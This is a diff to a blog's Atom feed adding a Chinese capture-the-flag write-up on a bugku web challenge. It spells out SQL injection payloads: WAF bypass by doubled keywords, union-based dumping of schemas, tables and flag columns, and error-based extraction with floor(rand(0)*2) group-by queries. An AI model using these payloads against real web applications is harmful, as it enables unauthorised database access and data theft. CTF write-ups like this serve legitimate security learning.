@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2018-08-17T06:21:21.860Z</updated>
+  <updated>2018-08-17T07:17:07.788Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,34 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>SQL报错注入</title>
+    <link href="http://yoursite.com/2018/08/17/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
+    <id>http://yoursite.com/2018/08/17/SQL报错注入/</id>
+    <published>2018-08-17T06:55:49.000Z</published>
+    <updated>2018-08-17T07:17:07.788Z</updated>
+    
+    <content type="html"><![CDATA[<p>快草了两个月的bugku-web类型的题，感觉基本web类型都有了一些大概的了解，当然比不上dalao的掌控雷电的操作，后面就是多玩一会python了，毕竟CTF中脚本不会写是真的硬伤。</p><p>这道题是web-150分的题，看了一下网上的WP不多，我也是找了一堆资料，看了看相似的体型才把这道题做的差不多。</p><p>题名：多次，<a href="http://120.24.86.145:9004/1ndex.php?id=1" target="_blank" rel="noopener">网址链接</a></p><p>首先打开网页看到id这个参数，很经典的SQL注入。于是测试单引号过滤<strong>?id=1’</strong>，页面发生变化，猜测位查询语句为单引号闭合。<br><img src="/2018/08/17/SQL报错注入/1.png" alt=""><br>再次进行测试，<strong>?id=1′ or 1=1%23 </strong>，发现并无变化。<br><img src="/2018/08/17/SQL报错注入/2.png" alt=""><br>猜测可能有WAF过滤，于是测试双重写or，<strong>?id=1′ oorr 1=1%23</strong> ，测试发现页面改变<br><img src="/2018/08/17/SQL报错注入/3.png" alt=""></p><p>进行测试过滤，使用异或符号（^）搭配length函数开始测试。</p><p><em>如何判断是否过滤，例如union函数没有过滤，那么length(‘union’)=0是不成立的，即该语句布尔值为0，并且前面的查询语句布尔值恒等于1，1^0=1，1^1=0。则为1返回正常页面，不正常返回错误页面。</em><br><img src="/2018/08/17/SQL报错注入/4.png" alt=""><br>经测试：or，and，union，select被过滤。那么接下来就是常规测试。</p><p><strong>?id=1%27 oorrder by 2%23</strong>，测试列数为2。（注意order里面的or）<br><img src="/2018/08/17/SQL报错注入/5.png" alt=""></p><h1 id="爆数据库"><a href="#爆数据库" class="headerlink" title="爆数据库"></a>爆数据库</h1><p>?id=-1%27 uniounionn selecselectt 1,group_concat(schema_name) from infoorrmation_schema.schemata%23（坑点：<strong>information里面的or</strong>）<br><img src="/2018/08/17/SQL报错注入/6.png" alt=""></p><h1 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h1><p>?id=-1%27 uniounionn selecselectt 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=0x776562313030322d31（十六进制码为web1002-1）%23<br><img src="/2018/08/17/SQL报错注入/7.png" alt=""></p><h1 id="爆出数据"><a href="#爆出数据" class="headerlink" title="爆出数据"></a>爆出数据</h1><p>?id=-1%27 uniounionn selecselectt 1,flag1 from flag1 %23<br><img src="/2018/08/17/SQL报错注入/8.png" alt=""><br>然后题目提示还有一个flag在下一关的地址。根据上面的操作，地址可能在address列里。</p><h1 id="寻找下一关地址"><a href="#寻找下一关地址" class="headerlink" title="寻找下一关地址"></a>寻找下一关地址</h1><p>?id=-1%27 uniounionn selecselectt 1,address from flag1 %23<br><img src="/2018/08/17/SQL报错注入/9.png" alt=""></p><h2 id="找到下一关地址"><a href="#找到下一关地址" class="headerlink" title="找到下一关地址"></a>找到下一关地址</h2><p><img src="/2018/08/17/SQL报错注入/10.png" alt=""><br>OK，还是向上面的一样测试，发现还是单引号过滤。<br><img src="/2018/08/17/SQL报错注入/11.png" alt=""><br>发现还是有回显我们测试的语句，突然发现这个WAF过滤的有点奇怪，这个过滤了union<br><img src="/2018/08/17/SQL报错注入/12.png" alt=""><br>那我将union重写，发现直接不回显，可能是后端的专门对这种产生过滤。<br><img src="/2018/08/17/SQL报错注入/13.PNG" alt=""><br>因为还发现有报错产生，那么我就进行报错盲注测试。</p><p>盲注测试公式：<strong>union select count(<em>),concat(version(),floor(rand(0)</em>2))x from information_schema.tables group by x;</strong></p><p>其中<strong>version()</strong>改成相应的注入语句。公式需要灵活变通，例如本题中的union被过滤，那么将语句改为or and连接的形式，并且适当添加相应的列数。Ps：盲注相关原理在文章末尾链接。</p><p> <em>or (select 1 from(select count(</em>),concat(0x23,(select schema_name from information_schema.schemata limit 1,1),0x23,floor(rand(0)<em>2))x from information_schema.schemata group by x)a)%23</em></p><p>因为不能用union进行注入，所以改变一下形式使用or，就这个走了好多弯路，因为or只能使用1个跟1个比，否则将会出错<strong>Operand should contain 1 column(s) </strong>, 且(select count(<em>),concat(0x23,(select schema_name from information_schema.schemata limit 1,1),0x23,floor(rand(0)</em>2))x from information_schema.schemata group by x)这条语句将会产生一个虚拟表，你在虚拟表进行查询时需要起一个别名，我在这里起的a，于是报错爆来数据库，下面的操作跟第一关一样。<br><img src="/2018/08/17/SQL报错注入/14.png" alt=""><br>但是其中爆数据时产生了一些问题，说是子查询返回超过了一行但是猜测肯定是只有一行的，估计是出题人加了回车产生了换行。<br><img src="/2018/08/17/SQL报错注入/15.png" alt=""><br>解决方法：left((select flag2 from flag2),40)，取前40个字符。<br><img src="/2018/08/17/SQL报错注入/16.png" alt=""></p><h2 id="相关链接："><a href="#相关链接：" class="headerlink" title="相关链接："></a>相关链接：</h2><p><a href="https://blog.csdn.net/qq_35544379/article/details/77453019" target="_blank" rel="noopener">https://blog.csdn.net/qq_35544379/article/details/77453019</a></p><p><a href="https://blog.csdn.net/he_and/article/details/80455884" target="_blank" rel="noopener">https://blog.csdn.net/he_and/article/details/80455884</a></p><p><a href="http://wyb0.com/" target="_blank" rel="noopener">http://wyb0.com/</a></p><blockquote><p><strong>两天时间全部花费在这个报错注入上，不过懂了好多SQL上的东西，也算是少有收获。</strong></p></blockquote>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;快草了两个月的bugku-web类型的题，感觉基本web类型都有了一些大概的了解，当然比不上dalao的掌控雷电的操作，后面就是多玩一会python了，毕竟CTF中脚本不会写是真的硬伤。&lt;/p&gt;
+&lt;p&gt;这道题是web-150分的题，看了一下网上的WP不多，我也是找了一堆资料
+      
+    
+    </summary>
+    
+      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
+    
+    
+      <category term="SQLinjection" scheme="http://yoursite.com/tags/SQLinjection/"/>
+    
+      <category term="手动注入" scheme="http://yoursite.com/tags/%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
   
   <entry>
     <title>SQLMAP-POST注入</title>
